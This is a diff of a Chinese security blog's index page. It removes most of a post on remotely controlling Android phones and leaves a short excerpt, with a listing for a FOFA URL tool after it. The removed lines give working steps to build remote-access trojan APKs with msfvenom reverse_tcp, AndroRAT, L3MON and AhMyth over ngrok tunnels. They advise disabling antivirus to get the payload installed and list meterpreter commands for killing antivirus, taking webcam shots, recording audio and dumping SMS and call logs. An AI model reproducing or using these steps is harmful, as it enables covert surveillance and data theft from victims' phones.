@@ -27,7 +27,7 @@
       switchTab();
       window.addEventListener('hashchange', switchTab, false);
   })();
-  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/avatar.png" alt="W01fh4cker&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Follow Me" href="https://github.com/W01fh4cker"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-06T16:00:00.000Z" title="2022-10-7 12:00:00 ├F10: AM┤">2022-10-07</time>发表</span><span class="level-item"><time dateTime="2022-10-07T12:38:33.087Z" title="2022-10-7 8:38:33 ├F10: PM┤">2022-10-07</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/hobby/">hobby</a></span><span class="level-item">14 分钟读完 (大约2136个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/07/how_do_hackers_gain_control_of_your_phone_remotely/">浅谈几种黑客远程控制目标手机的方式</a></h1><div class="content"><h1 id="零、简介"><a href="#零、简介" class="headerlink" title="零、简介"></a>零、简介</h1><p>最近的一些项目中需要远控安卓设备，所以就整理了四种可以生成远控<code>apk</code>文件的方法：<code>Metasploit</code>、<code>AndroRAT</code>、<code>L3MON</code>以及<code>AyMyth修改版</code>。</p>
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/avatar.png" alt="W01fh4cker&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Follow Me" href="https://github.com/W01fh4cker"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-06T16:00:00.000Z" title="2022-10-7 12:00:00 ├F10: AM┤">2022-10-07</time>发表</span><span class="level-item"><time dateTime="2022-10-07T12:42:41.925Z" title="2022-10-7 8:42:41 ├F10: PM┤">2022-10-07</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/hobby/">hobby</a></span><span class="level-item">14 分钟读完 (大约2137个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/07/how_do_hackers_gain_control_of_your_phone_remotely/">浅谈几种黑客远程控制目标手机的方式</a></h1><div class="content"><h1 id="零、简介"><a href="#零、简介" class="headerlink" title="零、简介"></a>零、简介</h1><p>最近的一些项目中需要远控安卓设备，所以就整理了四种可以生成远控<code>apk</code>文件的方法：<code>Metasploit</code>、<code>AndroRAT</code>、<code>L3MON</code>以及<code>AyMyth修改版</code>。</p>
 <p>我这个人比较直率，先说说结论：</p>
 <ol>
 <li><p><code>Metasploit</code>和<code>AndroRAT</code>生成的都是<code>32</code>位的，我在我<code>64</code>位的手机上面进行多次试验，但是没有成功；可能的原因是我是采用本地<code>kali</code>穿透的方式去做的，而不是部署在公网的方式，中间由于一些网络环境的原因失败了。由于时间关系，我并没有再部署到公网上面进行尝试了，各位小伙伴可以自行测试，成功的可以联系我。</p>
@@ -41,100 +41,7 @@
 <h1 id="一、Metasploit-仅支持32位手机系统"><a href="#一、Metasploit-仅支持32位手机系统" class="headerlink" title="一、Metasploit(仅支持32位手机系统)"></a>一、Metasploit(仅支持32位手机系统)</h1><h2 id="1-对你的本地kali进行内网穿透"><a href="#1-对你的本地kali进行内网穿透" class="headerlink" title="1. 对你的本地kali进行内网穿透"></a>1. 对你的本地kali进行内网穿透</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://ngrok.com/">https://ngrok.com/</a></p>
 </blockquote>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006182235.png" alt="ngrok 内网穿透"></p>
-<p>注册之后，在后台下载<code>ngrok</code>的二进制文件压缩包，然后根据说明文件一步步做即可，最后一步我们的命令为<code>./ngrok tcp 6666</code>：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006182916.png"></p>
-<p>如果长成下面这样，就表示穿透成功了：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006183550.png"></p>
-<h2 id="2-使用metasploit生成木马apk文件"><a href="#2-使用metasploit生成木马apk文件" class="headerlink" title="2. 使用metasploit生成木马apk文件"></a>2. 使用metasploit生成木马apk文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=填写你的穿透地址 LPORT=填写你的穿透的端口 &gt; hahaha.apk </span><br></pre></td></tr></table></figure>
-
-<p>成功生成：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006184436.png"></p>
-<p>传到手机目录下面并安装，但是不要打开。如果被手机检测到是病毒的，可以将手机里的杀毒软件或者手机管家强制关停然后断网安装。</p>
-<h2 id="3-使用metasploit进行攻击"><a href="#3-使用metasploit进行攻击" class="headerlink" title="3. 使用metasploit进行攻击"></a>3. 使用metasploit进行攻击</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use /exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload /android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>如果刚刚你是断网安装的，那么就联网。手机上打开这个病毒软件。</p>
-<p>可以看到<code>metasploit</code>这边立即有了反应：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006192519.png"></p>
-<p>但是显示<code>session</code>运行失败，查询得知<code>metasploit</code>生成的木马是<code>32</code>位的，而我的手机是64位的。</p>
-<p>如果有那位师傅成功了，可以联系我。</p>
-<p>这里还是放出如果拿到<code>session</code>了可以做什么：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run killav //关闭杀软</span><br><span class="line">webcam_snap //拍照</span><br><span class="line">ps //查看安卓手机进程</span><br><span class="line">record_mic //拍摄视频</span><br><span class="line">dump_calllog //获取通讯录</span><br><span class="line">dump_sms //获取短信</span><br></pre></td></tr></table></figure>
-
-<h1 id="二、AndroRAT-仅支持32位手机系统"><a href="#二、AndroRAT-仅支持32位手机系统" class="headerlink" title="二、AndroRAT(仅支持32位手机系统)"></a>二、AndroRAT(仅支持32位手机系统)</h1><h2 id="1-下载AndroRAT、安装环境"><a href="#1-下载AndroRAT、安装环境" class="headerlink" title="1. 下载AndroRAT、安装环境"></a>1. 下载AndroRAT、安装环境</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/karma9874/AndroRAT.git</span><br><span class="line"><span class="built_in">cd</span> AndroRAT</span><br><span class="line">pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<p>和第一种一样，进行内网穿透。</p>
-<h2 id="2-运行AndroRAT"><a href="#2-运行AndroRAT" class="headerlink" title="2. 运行AndroRAT"></a>2. 运行AndroRAT</h2><p>首先你需要使用<code>ifconfig</code>去确认你的<code>IP</code>，比如我的是：<code>192.168.44.132</code>。</p>
-<p>然后使用如下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 androRAT.py  --build -i 你的ngrok穿透地址 -p 你的ngrok穿透端口 -o foobar.apk</span><br></pre></td></tr></table></figure>
-
-<p>可以看到木马文件已经生成成功：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006210925.png"></p>
-<p>然后继续在命令行执行以下命令：</p>
-<p>先开启<code>ngrok</code>：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok tcp 7788</span><br></pre></td></tr></table></figure>
-
-<p>然后监听这个端口：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 androRAT.py --shell -i 0.0.0.0 -p 7788</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006213145.png"></p>
-<p>依然是断网安装，否则会被手机识别为”高危病毒”；然后联网，打开安装的木马软件。</p>
-<p>可惜由于生成的<code>apk</code>文件是<code>x86</code>架构的，不符合我的<code>x64</code>架构的手机系统，所以没有上线。</p>
-<p>如果上线成功，将是这样的情景：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006220612.png"></p>
-<h1 id="三、L3MON"><a href="#三、L3MON" class="headerlink" title="三、L3MON"></a>三、L3MON</h1><h2 id="1-下载L3MON、安装环境"><a href="#1-下载L3MON、安装环境" class="headerlink" title="1. 下载L3MON、安装环境"></a>1. 下载L3MON、安装环境</h2><blockquote>
-<p>需要注意的是，需要java8的环境！！！</p>
-</blockquote>
-<p><code>kali</code>默认的是<code>java11</code>，如果你需要安装<code>Java8</code>，可以执行以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /usr/local/java</span><br><span class="line"><span class="built_in">cp</span> jdk-8u202-linux-x64.tar.gz /usr/local/java</span><br><span class="line"><span class="built_in">cd</span> /usr/local/java</span><br><span class="line">sudo tar -xzvf jdk-8u202-linux-x64.tar.gz</span><br><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
-
-<p>然后把下面这段内容复制到配置文件的末尾：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/java/jdk1.8.0_202</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure>
-
-<p>然后执行以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install <span class="string">&quot;/usr/bin/java&quot;</span> <span class="string">&quot;java&quot;</span> <span class="string">&quot;/usr/local/java/jdk1.8.0_202/bin/java&quot;</span> 1</span><br><span class="line">sudo update-alternatives --install <span class="string">&quot;/usr/bin/javac&quot;</span> <span class="string">&quot;javac&quot;</span> <span class="string">&quot;/usr/local/java/jdk1.8.0_202/bin/javac&quot;</span> 1</span><br><span class="line">sudo update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/java/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br><span class="line">sudo update-alternatives --install <span class="string">&quot;/usr/bin/javaws&quot;</span> <span class="string">&quot;javaws&quot;</span> <span class="string">&quot;/usr/local/java/jdk1.8.0_202/bin/javaws&quot;</span> 1</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
-
-<p>这些都完成之后，我们可以使用命令<code>update-alternatives --config java</code>以及<code>update-alternatives --config javac</code>快速管理<code>java</code>以及<code>javac</code>的版本了。</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/23b4fed061616aa13f29ac85e110ce5.png"></p>
-<p>如果你没有<code>nodejs</code>环境，则需要执行以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget  https://nodejs.org/dist/v16.14.2/node-v16.14.2-linux-x64.tar.xz</span><br><span class="line">tar -xvf node-v16.14.2-linux-x64.tar.xz</span><br><span class="line"><span class="built_in">mv</span> node-v16.14.2-linux-x64 nodejs</span><br><span class="line">sudo <span class="built_in">mv</span> nodejs/ /usr/local/sbin/</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/sbin/nodejs/bin/node /usr/bin/</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/sbin/nodejs/bin/npm /usr/bin/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007171516.png"></p>
-<p>弄完了<code>java8</code>的环境之后，执行以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/D3VL/L3MON.git</span><br><span class="line"><span class="built_in">cd</span> L3MON/server</span><br><span class="line">sudo npm install pm2 -g</span><br><span class="line">sudo npm install</span><br><span class="line">pm2 start index.js</span><br><span class="line"><span class="comment">#如果出现pm2命令找不到的情况，请执行：ln -s /usr/local/sbin/nodejs/bin/pm2 /usr/local/bin</span></span><br><span class="line">pm2 startup</span><br><span class="line">pm2 stop index</span><br><span class="line"><span class="built_in">echo</span> -n W01fh4cker | <span class="built_in">md5sum</span>   <span class="comment">#生成密码的md5值a2029f3d219e6e800eb2a2c8efeceba5</span></span><br><span class="line">vim maindb.json <span class="comment">#把上面得到的md5值填入password中</span></span><br><span class="line">pm2 restart all</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-使用L3MON"><a href="#2-使用L3MON" class="headerlink" title="2. 使用L3MON"></a>2. 使用L3MON</h2><p>访问：<code>http://127.0.0.1:22533/login</code>，账号<code>admin</code>，密码<code>W01h4cker</code>。</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007111059.png"></p>
-<p>首先启动<code>ngrok</code>，执行命令：<code>./ngrok tcp 8899</code>。</p>
-<p>使用<code>L3MON</code>的<code>APK Builder</code>模块，填入我们的内网穿透的地址和端口：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007111339.png"></p>
-<p>构建完成之后，点击下载即可：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007175916.png"></p>
-<p>我们在手机上安装软件，并给予该软件所有的权限：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/6adf8d49a99a86710c1d8d3a65a8093.jpg"></p>
-<p>但是很遗憾的是，这个方法我没有试验成功，可能与网络环境有关系，如果有小伙伴成功了，可以联系我。</p>
-<p>这里展示一下他人的成功案例：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/8af8d803b4b8d4e2774885e987bcef5.png"></p>
-<h1 id="四、AyMyth修改版"><a href="#四、AyMyth修改版" class="headerlink" title="四、AyMyth修改版"></a>四、AyMyth修改版</h1><h2 id="1-下载AyMyth、配置环境"><a href="#1-下载AyMyth、配置环境" class="headerlink" title="1.下载AyMyth、配置环境"></a>1.下载AyMyth、配置环境</h2><p>官方的仓库链接为：<code>https://github.com/AhMyth/AhMyth-Android-RAT</code>，但是<code>bug</code>比较多。我们采用修改版的，修改版的原仓库链接为：<code>https://github.com/HiddenPirates/AhMyth-Modified-Version</code>，很可惜的是作者关停了这个项目。我们这里采用其他人<code>fork</code>的版本。</p>
-<p>执行以下命令：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要java8、npm环境</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Morsmalleo/AhMyth-Modified-Version.git</span><br><span class="line"><span class="built_in">cd</span> AhMyth-Modified-Version/AhMyth-Server</span><br><span class="line">npm install electron-builder</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>
-
-<p>启动成功：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007195443.png"></p>
-<h2 id="2-使用Aymyth"><a href="#2-使用Aymyth" class="headerlink" title="2.使用Aymyth"></a>2.使用Aymyth</h2><p>我们这次在本地进行测试（远程测试测的心态有点崩）。</p>
-<p>我们监听<code>8899</code>端口，然后去生成一个<code>apk</code>文件：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007200634.png"></p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007200841.png"></p>
-<blockquote>
-<p>如果不能生成<code>apk</code>文件，我们可以去<code>https://github.com/AhMyth/AhMyth-Android-RAT/releases</code>下载二进制文件。</p>
-</blockquote>
-<p>我们把<code>apk</code>文件传到模拟器上面去：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007201033.png"></p>
-<p>成功上线：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007201127.png"></p>
-<p>我们点击<code>Open The Lab</code>，便可以很清晰地做很多事情：</p>
-<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221007201200.png"></p>
-</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-02T16:00:00.000Z" title="2022-10-3 12:00:00 ├F10: AM┤">2022-10-03</time>发表</span><span class="level-item"><time dateTime="2022-10-03T09:24:46.076Z" title="2022-10-3 5:24:46 ├F10: PM┤">2022-10-03</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/python/">python</a></span><span class="level-item">13 分钟读完 (大约1955个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/03/fofa_urls_collect_exe/">一个利用fofa采集url的工具，只采集url</a></h1><div class="content"><h1 id="一、项目地址："><a href="#一、项目地址：" class="headerlink" title="一、项目地址："></a>一、项目地址：</h1><blockquote>
+<p><img src="https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/20221006182235.png" alt="ngrok 内网穿透"></p></div><a class="article-more button is-small is-size-7" href="/2022/10/07/how_do_hackers_gain_control_of_your_phone_remotely/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-10-02T16:00:00.000Z" title="2022-10-3 12:00:00 ├F10: AM┤">2022-10-03</time>发表</span><span class="level-item"><time dateTime="2022-10-03T09:24:46.076Z" title="2022-10-3 5:24:46 ├F10: PM┤">2022-10-03</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/python/">python</a></span><span class="level-item">13 分钟读完 (大约1955个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/03/fofa_urls_collect_exe/">一个利用fofa采集url的工具，只采集url</a></h1><div class="content"><h1 id="一、项目地址："><a href="#一、项目地址：" class="headerlink" title="一、项目地址："></a>一、项目地址：</h1><blockquote>
 <p> <a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/Fofa-url/">https://github.com/W01fh4cker/Fofa-url/</a></p>
 </blockquote>
 <p>可以去<code>https://github.com/W01fh4cker/Fofa-url/releases/tag/v0.1.0-alpha</code>下下载打包好的程序，然后去<code>https://github.com/W01fh4cker/Fofa-url/blob/main/logo.ico</code>下载<code>logo</code>文件，这两个文件放在一个文件夹里面即可使用。</p>
